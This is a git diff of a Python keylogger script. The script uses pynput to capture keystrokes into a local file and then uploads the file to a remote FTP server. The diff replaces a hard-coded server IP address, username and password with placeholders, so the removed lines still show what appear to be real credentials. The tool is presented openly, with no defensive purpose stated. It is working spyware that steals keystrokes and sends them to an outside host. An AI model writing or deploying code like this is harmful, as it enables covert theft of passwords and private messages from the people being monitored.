@@ -1,6 +1,3 @@
-
-# from pynput import keyboard
-
 import ftplib
 from ftplib import FTP
 from pynput import keyboard
@@ -33,16 +30,16 @@ listener = keyboard.Listener(on_press=on_press)
 listener.start()
 
 # FTP server settings
-ftp_server = "108.48.125.159"
-ftp_username = "ftpconnection"
-ftp_password = "SECURESHELL"
+ftp_server = ["insert host name or ip"]
+ftp_username = ["insert username"]
+ftp_password = ["insert password"]
 
 # Connect to the FTP server
 ftp = ftplib.FTP(ftp_server)
 ftp.login(ftp_username, ftp_password)
 
 # Change to the remote directory
-ftp.cwd("/home/ftpconnection/files")
+ftp.cwd("insert/file/path/to/directory/in/ftp/server")
 
 # Open the local file
 with open("keylogs.txt", "rb") as f:
